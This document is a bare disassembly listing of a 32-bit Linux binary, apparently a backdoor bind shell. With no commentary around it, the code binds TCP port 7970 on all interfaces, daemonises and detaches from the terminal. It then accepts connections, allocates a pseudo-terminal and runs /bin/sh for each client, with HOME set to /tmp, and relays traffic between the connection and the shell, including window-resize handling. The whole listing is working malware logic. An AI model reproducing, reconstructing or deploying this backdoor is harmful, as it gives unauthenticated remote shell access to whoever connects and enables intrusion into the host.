xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push sym.__libc_csu_fini
push sym.__libc_csu_init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
push eax
call 0x8048926
pop ebx
add ebx, 0x1c52
mov eax, dword [ebx + 0x8c]
test eax, eax
je 0x8048939
call eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
cmp byte [obj.completed.1], 0
jne 0x8048978
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
je 0x8048971
mov esi, esi
add eax, 4
mov dword [obj.p.0], eax
call edx
mov eax, dword [obj.p.0]
mov edx, dword [eax]
test edx, edx
jne 0x804895c
mov byte [obj.completed.1], 1
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [obj.__JCR_LIST__]
test eax, eax
je 0x80489a4
mov eax, 0
test eax, eax
je 0x80489a4
sub esp, 0xc
push obj.__JCR_LIST__
call loc.imp.__gmon_start__
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
push ebx
push edx
mov eax, dword [obj.__CTOR_LIST__]
cmp eax, 0xffffffff
mov ebx, obj.__CTOR_LIST__
je 0x80493d4
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x80493c8
pop eax
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push 1
push 0
call sym.imp.kill
add esp, 0x10
sub esp, 8
push 0xf
push 0
call sym.imp.kill
add esp, 0x10
leave
ret
jmp dword [reloc.kill]
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push sym.sig_child
push 0x11
call sym.imp.signal
add esp, 0x10
sub esp, 4
push 1
push 0
push 0xffffffffffffffff
call sym.imp.waitpid
add esp, 0x10
leave
ret
jmp dword [reloc.signal]
jmp dword [reloc.waitpid]
push ebp
mov ebp, esp
push ebx
push eax
mov eax, loc.__fini_array_end
sub eax, loc.__fini_array_end
sar eax, 2
test eax, eax
lea ebx, [eax - 1]
jne 0x80493a4
mov ebx, dword [var_4h]
leave
jmp sym._fini
mov esi, esi
call dword [ebx*4 + loc.__fini_array_end]
mov edx, ebx
dec ebx
test edx, edx
jne 0x80493a4
jmp 0x8049399
push ebp
mov ebp, esp
sub esp, 8
call sym.call_gmon_start
call sym.frame_dummy
call sym.__do_global_ctors_aux
leave
ret
push ebp
mov ebp, esp
sub esp, 0x218
sub esp, 8
push 2
push str._dev_ptmx
call sym.imp.open
add esp, 0x10
mov dword [fildes], eax
sub esp, 0xc
push dword [fildes]
call sym.imp.close
add esp, 0x10
mov dword [var_20ch], 0
cmp dword [var_20ch], 0xff
jle 0x8048a7e
jmp 0x8048b2b
sub esp, 4
lea eax, [path]
push eax
push str._dev_pty
push dword [var_20ch]
call sym.get_tty
add esp, 0x10
sub esp, 8
push 2
lea eax, [path]
push eax
call sym.imp.open
add esp, 0x10
mov edx, eax
mov eax, dword [arg_ch]
mov dword [eax], edx
mov eax, dword [arg_ch]
cmp dword [eax], 0
jns 0x8048ac0
jmp 0x8048b1e
sub esp, 4
lea eax, [path]
push eax
push str._dev_tty
push dword [var_20ch]
call sym.get_tty
add esp, 0x10
sub esp, 8
push 2
lea eax, [path]
push eax
call sym.imp.open
add esp, 0x10
mov edx, eax
mov eax, dword [arg_8h]
mov dword [eax], edx
mov eax, dword [arg_8h]
cmp dword [eax], 0
jns 0x8048b12
sub esp, 0xc
mov eax, dword [arg_ch]
push dword [eax]
call sym.imp.close
add esp, 0x10
jmp 0x8048b1e
mov dword [var_214h], 1
jmp 0x8048b35
lea eax, [var_20ch]
inc dword [eax]
jmp 0x8048a6d
mov dword [var_214h], 0
mov eax, dword [var_214h]
leave
ret
jmp dword [reloc.open]
jmp dword [reloc.close]
push ebp
mov ebp, esp
push edi
push esi
sub esp, 0x50
lea edi, [var_28h]
mov esi, str.pqrstuvwxyzabcde
cld
mov ecx, 0x11
rep movsb byte es:[edi], byte ptr [esi]
lea edi, [var_48h]
mov esi, str.0123456789abcdef
cld
mov ecx, 0x11
rep movsb byte es:[edi], byte ptr [esi]
sub esp, 0xc
push dword [src]
call sym.imp.strlen
add esp, 0x10
mov dword [var_4ch], eax
sub esp, 8
push dword [src]
push dword [dest]
call sym.imp.strcpy
add esp, 0x10
mov eax, dword [var_4ch]
mov edx, dword [dest]
add edx, eax
mov eax, dword [arg_8h]
sar eax, 4
and eax, 0xf
mov al, byte [eax + ebp - 0x28]
mov byte [edx], al
mov eax, dword [var_4ch]
add eax, dword [dest]
lea edx, [eax + 1]
mov eax, dword [arg_8h]
and eax, 0xf
mov al, byte [eax + ebp - 0x48]
mov byte [edx], al
mov eax, dword [var_4ch]
add eax, dword [dest]
add eax, 2
mov byte [eax], 0
lea esp, [var_8h]
pop esi
pop edi
leave
ret
jmp dword [reloc.strlen]
jmp dword [reloc.strcpy]
push ebp
mov ebp, esp
push esi
push ebx
call sym._init
mov eax, loc.__fini_array_end
sub eax, loc.__fini_array_end
sar eax, 2
xor ebx, ebx
cmp ebx, eax
jae 0x804937c
mov esi, eax
nop
call dword [ebx*4 + loc.__fini_array_end]
inc ebx
cmp ebx, esi
jb 0x8049370
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
sub esp, 0x18850
and esp, 0xfffffff0
mov eax, 0
sub esp, eax
sub esp, 4
push 6
push 1
push 2
call sym.imp.socket
add esp, 0x10
mov dword [socket], eax
cmp dword [socket], 0
jns 0x8048bdc
sub esp, 0xc
push str.socket
call sym.imp.perror
add esp, 0x10
mov dword [ebp - 0x1884c], 1
jmp 0x8049343
sub esp, 8
push 0x10
lea eax, [address]
push eax
call sym.imp.bzero
add esp, 0x10
mov word [address], 2
sub esp, 0xc
push 0
call sym.imp.htonl
add esp, 0x10
mov dword [var_24h], eax
sub esp, 0xc
push 0x1f22
call sym.imp.htons
add esp, 0x10
mov word [var_26h], ax
sub esp, 4
push 0x10
lea eax, [address]
push eax
push dword [socket]
call sym.imp.bind
add esp, 0x10
test eax, eax
jns 0x8048c4e
sub esp, 0xc
push str.bind
call sym.imp.perror
add esp, 0x10
mov dword [ebp - 0x1884c], 1
jmp 0x8049343
sub esp, 8
push 5
push dword [socket]
call sym.imp.listen
add esp, 0x10
test eax, eax
jns 0x8048c81
sub esp, 0xc
push str.listen
call sym.imp.perror
add esp, 0x10
mov dword [ebp - 0x1884c], 1
jmp 0x8049343
sub esp, 0xc
push dword [obj.stdout]
call sym.imp.fflush
add esp, 0x10
call sym.imp.fork
mov dword [fildes], eax
cmp dword [fildes], 0
je 0x8048caf
mov dword [ebp - 0x1884c], 0
jmp 0x8049343
call sym.imp.setsid
sub esp, 0xc
push 0x804944d
call sym.imp.chdir
add esp, 0x10
sub esp, 8
push 2
push str._dev_null
call sym.imp.open
add esp, 0x10
mov dword [fildes], eax
sub esp, 8
push 0
push dword [fildes]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 1
push dword [fildes]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 2
push dword [fildes]
call sym.imp.dup2
add esp, 0x10
sub esp, 0xc
push dword [fildes]
call sym.imp.close
add esp, 0x10
sub esp, 8
push 1
push 1
call sym.imp.signal
add esp, 0x10
sub esp, 8
push sym.sig_child
push 0x11
call sym.imp.signal
add esp, 0x10
mov dword [var_44h], 0x10
sub esp, 4
lea eax, [var_44h]
push eax
lea eax, [var_38h]
push eax
push dword [socket]
call sym.imp.accept
add esp, 0x10
mov dword [fd], eax
cmp dword [fd], 0
jns 0x8048d60
jmp 0x8048d38
call sym.imp.fork
mov dword [fildes], eax
cmp dword [fildes], 0
jne 0x8049330
mov dword [ebp - 0x80e8], 0x8049459
mov dword [ebp - 0x80e4], 0x804945c
mov dword [ebp - 0x80e0], 0
lea eax, [ebp - 0x187f8]
mov dword [ebp - 0x84e8], eax
sub esp, 4
push str._tmp
push str.HOME_tmp
lea eax, [ebp - 0x187f8]
push eax
call sym.imp.sprintf
add esp, 0x10
mov dword [ebp - 0x186ec], 0
sub esp, 4
push 0x100
lea edx, [ebp - 0x186e8]
mov eax, dword [ebp - 0x186ec]
shl eax, 8
lea eax, [eax + edx]
push eax
push dword [fd]
call sym.imp.read
add esp, 0x10
mov dword [ebp - 0x186f0], eax
mov ecx, dword [ebp - 0x186ec]
lea edx, [ebp - 0x186e8]
mov eax, dword [ebp - 0x186ec]
shl eax, 8
lea eax, [eax + edx]
mov dword [ebp + ecx*4 - 0x84e4], eax
lea eax, [ebp - 0x186ec]
inc dword [eax]
cmp dword [ebp - 0x186ec], 0xff
jg 0x8048e49
cmp dword [ebp - 0x186f0], 0xff
jle 0x8048e49
mov eax, dword [ebp - 0x186ec]
shl eax, 8
lea edx, [var_8h]
add eax, edx
sub eax, 0x187e0
cmp byte [eax], 0xa
jne 0x8048dc2
mov eax, dword [ebp - 0x186ec]
mov dword [ebp + eax*4 - 0x84e4], 0
sub esp, 8
push 0
push 0
call sym.imp.setpgid
add esp, 0x10
sub esp, 8
lea eax, [var_50h]
push eax
lea eax, [var_4ch]
push eax
call sym.open_tty
add esp, 0x10
test eax, eax
jne 0x8048ed3
lea edi, [ebp - 0x18818]
mov esi, str.Cant_fork_pty__bye__n
cld
mov ecx, 0x16
rep movsb byte es:[edi], byte ptr [esi]
sub esp, 4
lea eax, [ebp - 0x18818]
sub esp, 8
push eax
call sym.imp.strlen
add esp, 0xc
push eax
lea eax, [ebp - 0x18818]
push eax
push dword [fd]
call sym.imp.write
add esp, 0x10
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp.exit
call sym.imp.fork
mov dword [pid], eax
cmp dword [pid], 0
jne 0x8048fa1
sub esp, 0xc
push dword [var_50h]
call sym.imp.close
add esp, 0x10
call sym.imp.setsid
sub esp, 8
push 0x540e
push dword [var_4ch]
call sym.imp.ioctl
add esp, 0x10
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push dword [socket]
call sym.imp.close
add esp, 0x10
sub esp, 8
push 0
push 1
call sym.imp.signal
add esp, 0x10
sub esp, 8
push 0
push 0x11
call sym.imp.signal
add esp, 0x10
sub esp, 8
push 0
push dword [var_4ch]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 1
push dword [var_4ch]
call sym.imp.dup2
add esp, 0x10
sub esp, 8
push 2
push dword [var_4ch]
call sym.imp.dup2
add esp, 0x10
sub esp, 0xc
push dword [var_4ch]
call sym.imp.close
add esp, 0x10
sub esp, 4
lea eax, [ebp - 0x84e8]
push eax
lea eax, [ebp - 0x80e8]
push eax
push str._bin_sh
call sym.imp.execve
add esp, 0x10
sub esp, 0xc
push dword [var_4ch]
call sym.imp.close
add esp, 0x10
sub esp, 8
push sym.hangout
push 1
call sym.imp.signal
add esp, 0x10
sub esp, 8
push sym.hangout
push 0xf
call sym.imp.signal
add esp, 0x10
mov eax, 0
mov ecx, 0x20
lea edi, [var_d8h]
cld
rep stosd dword es:[edi], eax
mov eax, ecx
mov dword [ebp - 0x1881c], eax
mov eax, edi
mov dword [ebp - 0x18820], eax
mov eax, dword [var_50h]
mov edx, eax
shr edx, 5
mov eax, dword [var_50h]
and eax, 0x1f
bts dword [ebp + edx*4 - 0xd8], eax
mov eax, dword [fd]
mov edx, eax
shr edx, 5
mov eax, dword [fd]
and eax, 0x1f
bts dword [ebp + edx*4 - 0xd8], eax
sub esp, 0xc
push 0
push 0
push 0
lea eax, [var_d8h]
push eax
mov eax, dword [var_50h]
cmp eax, dword [fd]
jle 0x8049046
mov eax, dword [var_50h]
inc eax
mov dword [ebp - 0x18850], eax
jmp 0x8049050
mov edx, dword [fd]
inc edx
mov dword [ebp - 0x18850], edx
push dword [ebp - 0x18850]
call sym.imp.select
add esp, 0x20
test eax, eax
jns 0x8049067
jmp 0x80492e5
mov eax, dword [var_50h]
mov edx, eax
and edx, 0x1f
mov eax, dword [var_50h]
shr eax, 5
bt dword [ebp + eax*4 - 0xd8], edx
setb al
test al, al
je 0x80490d6
sub esp, 4
push 0x8000
lea eax, [ebp - 0x80d8]
push eax
push dword [var_50h]
call sym.imp.read
add esp, 0x10
mov dword [ebp - 0x18820], eax
cmp dword [ebp - 0x18820], 0
jg 0x80490b2
jmp 0x80492e5
sub esp, 4
push dword [ebp - 0x18820]
lea eax, [ebp - 0x80d8]
push eax
push dword [fd]
call sym.imp.write
add esp, 0x10
test eax, eax
jg 0x80490d6
jmp 0x80492e5
mov eax, dword [fd]
mov edx, eax
and edx, 0x1f
mov eax, dword [fd]
shr eax, 5
bt dword [ebp + eax*4 - 0xd8], edx
setb al
test al, al
je 0x8048fd3
lea eax, [ebp - 0x80d8]
mov dword [ebp - 0x18824], eax
sub esp, 4
push 0x8000
lea eax, [ebp - 0x80d8]
push eax
push dword [fd]
call sym.imp.read
add esp, 0x10
mov dword [ebp - 0x18820], eax
cmp dword [ebp - 0x18820], 0
jg 0x8049131
jmp 0x80492e5
lea eax, [ebp - 0x80d8]
sub esp, 4
push dword [ebp - 0x18820]
push 0x1d
push eax
call sym.imp.memchr
add esp, 0x10
mov dword [ebp - 0x1881c], eax
cmp dword [ebp - 0x1881c], 0
je 0x80492c3
lea edx, [ebp - 0x80d8]
mov eax, dword [ebp - 0x1881c]
sub eax, edx
mov edx, eax
mov eax, dword [ebp - 0x18820]
sub eax, edx
mov dword [ebp - 0x1883c], eax
cmp dword [ebp - 0x1883c], 5
jle 0x804918f
mov dword [ebp - 0x1883c], 5
sub esp, 4
push dword [ebp - 0x1883c]
push dword [ebp - 0x1881c]
lea eax, [ebp - 0x18838]
push eax
call sym.imp.memcpy
add esp, 0x10
cmp dword [ebp - 0x1883c], 4
jg 0x80491dd
sub esp, 4
mov eax, 5
sub eax, dword [ebp - 0x1883c]
push eax
lea eax, [ebp - 0x18838]
add eax, dword [ebp - 0x1883c]
push eax
push dword [fd]
call sym.imp.read
add esp, 0x10
mov word [ebp - 0x18842], 0
mov word [ebp - 0x18844], 0
movzx eax, byte [ebp - 0x18837]
mov edx, eax
shl edx, 8
movzx ax, byte [ebp - 0x18836]
lea eax, [eax + edx]
mov word [ebp - 0x18846], ax
movzx eax, byte [ebp - 0x18835]
mov edx, eax
shl edx, 8
movzx ax, byte [ebp - 0x18834]
lea eax, [eax + edx]
mov word [ebp - 0x18848], ax
sub esp, 4
lea eax, [ebp - 0x18848]
push eax
push 0x5414
push dword [var_50h]
call sym.imp.ioctl
add esp, 0x10
sub esp, 8
push 0x1c
push 0
call sym.imp.kill
add esp, 0x10
sub esp, 4
lea edx, [ebp - 0x80d8]
mov eax, dword [ebp - 0x1881c]
sub eax, edx
push eax
lea eax, [ebp - 0x80d8]
push eax
push dword [var_50h]
call sym.imp.write
add esp, 0x10
lea eax, [ebp - 0x80d8]
add eax, dword [ebp - 0x18820]
sub eax, dword [ebp - 0x1881c]
sub eax, 5
mov dword [ebp - 0x1883c], eax
cmp dword [ebp - 0x1883c], 0
jle 0x8048fd3
sub esp, 4
push dword [ebp - 0x1883c]
mov eax, dword [ebp - 0x1881c]
add eax, 5
push eax
push dword [var_50h]
call sym.imp.write
add esp, 0x10
jmp 0x8048fd3
sub esp, 4
push dword [ebp - 0x18820]
push dword [ebp - 0x18824]
push dword [var_50h]
call sym.imp.write
add esp, 0x10
test eax, eax
jg 0x8048fd3
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push dword [socket]
call sym.imp.close
add esp, 0x10
sub esp, 0xc
push dword [var_50h]
call sym.imp.close
add esp, 0x10
sub esp, 4
push 0
push 0
push dword [pid]
call sym.imp.waitpid
add esp, 0x10
call sym.imp.vhangup
sub esp, 0xc
push 0
call sym.imp.exit
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
jmp 0x8048d38
mov eax, dword [ebp - 0x1884c]
lea esp, [var_8h]
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
push edx
call 0x80493e2
pop ebx
add ebx, 0x1196
call sym.__do_global_dtors_aux
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.write]
jmp dword [reloc.perror]
jmp dword [reloc.fork]
jmp dword [reloc.fflush]
jmp dword [reloc.select]
jmp dword [reloc.htonl]
jmp dword [reloc.execve]
jmp dword [reloc.memchr]
jmp dword [reloc.accept]
jmp dword [reloc.listen]
jmp dword [reloc.setsid]
jmp dword [reloc.vhangup]
jmp dword [reloc.chdir]
jmp dword [reloc.setpgid]
jmp dword [reloc.dup2]
jmp dword [reloc.bind]
jmp dword [reloc.memcpy]
jmp dword [reloc.bzero]
jmp dword [reloc.exit]
jmp dword [reloc.ioctl]
jmp dword [reloc.htons]
jmp dword [reloc.sprintf]
jmp dword [reloc.socket]
jmp dword [reloc.read]
